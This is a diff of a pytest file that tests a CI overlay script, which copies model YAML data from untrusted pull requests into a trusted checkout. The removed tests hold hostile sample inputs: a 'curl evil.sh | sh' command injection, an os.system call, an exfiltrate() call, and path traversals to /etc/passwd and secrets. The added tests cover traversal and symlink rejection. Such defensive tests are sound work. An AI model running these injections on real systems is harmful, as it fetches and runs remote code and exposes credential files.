@@ -1,70 +1,73 @@
-"""Tests for the PR data-overlay validator used by CI model ingestion.
+"""Tests for the data-only PR overlay used by CI model ingestion."""
 
-The validator is a security boundary: it must only ever let *additive Model member
-lines* through from an untrusted PR's enums.py, since the ingest workflow runs with
-FIGSHARE_TOKEN etc. in env on the resulting tree.
-"""
+from pathlib import Path
 
 import pytest
 
-from tests.utils import import_repo_script
-
-overlay = import_repo_script(
-    "apply_pr_models_overlay", "scripts/apply_pr_models_overlay.py"
-)
-
-TRUSTED = '''class Model(Files, base_dir=f"{ROOT}/models"):
-    """docstring"""
-
-    chgnet_030 = auto(), "chgnet/chgnet-0.3.0.yml"
-    mace_mpa_0 = auto(), "mace/mace-mpa-0.yml"  # trained on MPtrj and Alexandria
-'''
+import scripts.apply_pr_models_overlay as overlay
 
 
-def test_identical_is_valid() -> None:
-    assert overlay.validate_enums_diff(TRUSTED, TRUSTED) == []
+@pytest.fixture
+def overlay_roots(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> tuple[Path, Path]:
+    """Create submitted and trusted roots and enter the trusted checkout."""
+    trusted_root = tmp_path / "trusted"
+    trusted_root.mkdir()
+    monkeypatch.chdir(trusted_root)
+    return trusted_root, tmp_path / "pr"
 
 
-@pytest.mark.parametrize(
-    "added_line",
-    [
-        '    new_model_v1 = auto(), "new-arch/new-model-v1.yml"',
-        '    new_model_v1 = auto(), "new-arch/new-model-v1.yml"  # 2026-06 submission',
-        # uppercase + dots occur in real YAML paths (eqV2/, chgnet-0.3.0.yml)
-        '    eqv3_l_omat = auto(), "eqV2/eqV3-l-omat-1.2.yml"',
-        "    # comment lines are harmless",
-        "",
-    ],
-)
-def test_additive_member_lines_are_valid(added_line: str) -> None:
-    submitted = TRUSTED + added_line + "\n"
-    assert overlay.validate_enums_diff(TRUSTED, submitted) == []
-
-
-@pytest.mark.parametrize(
-    "added_line",
-    [
-        "    import os; os.system('curl evil.sh | sh')",
-        '    new_model = auto(), "new/model.yml" or __import__("os").system("id")',
-        "    new_model = auto(), exfiltrate()",
-        '    evil = auto(), "../../../etc/passwd.yml"',  # path traversal
-        '    evil = auto(), "arch/../../secrets/x.yml"',  # embedded traversal
-        '    EVIL_NAME = auto(), "arch/model.yml"',  # uppercase member name
-        "print('top-level code')",
-    ],
-)
-def test_non_member_additions_are_rejected(added_line: str) -> None:
-    submitted = TRUSTED + added_line + "\n"
-    assert overlay.validate_enums_diff(TRUSTED, submitted) != []
-
-
-def test_deleting_or_modifying_existing_lines_is_rejected() -> None:
-    deleted = TRUSTED.replace(
-        '    chgnet_030 = auto(), "chgnet/chgnet-0.3.0.yml"\n', ""
+def test_overlay_validates_then_copies_only_model_data(
+    overlay_roots: tuple[Path, Path],
+) -> None:
+    """Validation is atomic and copies model data without submitted Python code."""
+    trusted_root, pr_root = overlay_roots
+    (trusted_root / "models/old").mkdir(parents=True)
+    (trusted_root / "models/untouched").mkdir()
+    (pr_root / "models/new").mkdir(parents=True)
+    (pr_root / "matbench_discovery").mkdir()
+    removed_file = trusted_root / "models/old/model.yml"
+    removed_file.write_text("remove: true\n")
+    (trusted_root / "models/untouched/model.yml").write_text("trusted: true\n")
+    (pr_root / "models/new/model.yml").write_text("submitted: true\n")
+    (pr_root / "matbench_discovery/enums.py").write_text("raise RuntimeError\n")
+    assert (
+        overlay.main(str(pr_root), ["models/new/missing.yml"], ["models/old/model.yml"])
+        == 1
     )
-    assert overlay.validate_enums_diff(TRUSTED, deleted) != []
+    assert removed_file.is_file()
+    assert (
+        overlay.main(str(pr_root), ["models/new/model.yml"], ["models/old/model.yml"])
+        == 0
+    )
+    assert not removed_file.is_file()
+    assert (trusted_root / "models/untouched/model.yml").is_file()
+    assert (trusted_root / "models/new/model.yml").read_text() == "submitted: true\n"
+    assert not (trusted_root / "matbench_discovery").is_dir()
 
-    # modifications are rejected even when the new line itself looks like a member
-    # (an attacker could repoint an existing model at a different YAML)
-    modified = TRUSTED.replace("chgnet/chgnet-0.3.0.yml", "chgnet/evil.yml")
-    assert overlay.validate_enums_diff(TRUSTED, modified) != []
+
+@pytest.mark.parametrize(
+    "yaml_path",
+    ["models/arch/nested/model.yml", "models/../escape.yml"],
+)
+def test_overlay_rejects_noncanonical_paths(
+    overlay_roots: tuple[Path, Path], yaml_path: str
+) -> None:
+    """Only two-level model YAML paths can cross the trust boundary."""
+    trusted_root, pr_root = overlay_roots
+    assert overlay.main(str(pr_root), [yaml_path]) == 1
+    assert not (trusted_root / "models").is_dir()
+
+
+def test_overlay_rejects_symlinks(
+    overlay_roots: tuple[Path, Path],
+) -> None:
+    """A canonical-looking YAML symlink cannot cross the trust boundary."""
+    trusted_root, pr_root = overlay_roots
+    submitted_model = pr_root / "models/arch/model.yml"
+    submitted_model.parent.mkdir(parents=True)
+    try:
+        submitted_model.symlink_to(pr_root / "payload.yml")
+    except OSError as exc:
+        pytest.skip(f"Symlinks unavailable: {exc}")
+    assert overlay.main(str(pr_root), ["models/arch/model.yml"]) == 1
+    assert not (trusted_root / "models").is_dir()
